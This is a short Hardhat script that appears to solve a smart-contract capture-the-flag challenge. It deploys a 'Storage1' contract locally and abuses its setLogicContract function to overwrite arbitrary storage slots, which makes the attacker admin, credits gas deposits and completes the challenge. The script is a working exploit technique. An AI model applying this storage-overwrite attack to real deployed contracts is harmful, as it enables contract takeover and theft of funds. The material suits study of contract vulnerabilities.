const { ethers } = require("hardhat");

async function deploy(deployer) {
  const Storage1 = await ethers.getContractFactory("Storage1", deployer);
  const storage1 = await Storage1.deploy();
  console.log("Storage1 contract:", storage1.address);

  return storage1;
}
async function byte32(i) {
  const amount = ethers.BigNumber.from(i);
  return ethers.utils.hexZeroPad(amount.toHexString(), 32);
}
async function exploit(attacker, target) {
  try {
    await target.connect(attacker).isComplete();
  } catch (error) {
    console.log("Before: isComplete():", error.toString());
  }
  await target.connect(attacker).setLogicContract(byte32(1), attacker.address);
  let solt = ethers.utils.solidityKeccak256(
    ["uint256", "uint256"],
    [ethers.BigNumber.from(attacker.address), 2]
  );
  await target.connect(attacker).setLogicContract(solt, attacker.address);
  console.log("After: Admin:", await target.connect(attacker).admin());

  console.log(
    "After: GasDeposits(attacker):",
    await target.connect(attacker).gasDeposits(attacker.address)
  );
  console.log(
    "After: isComplete():",
    await target.connect(attacker).isComplete()
  );
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let storage1 = await deploy(deployer);

  await exploit(attacker, storage1);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
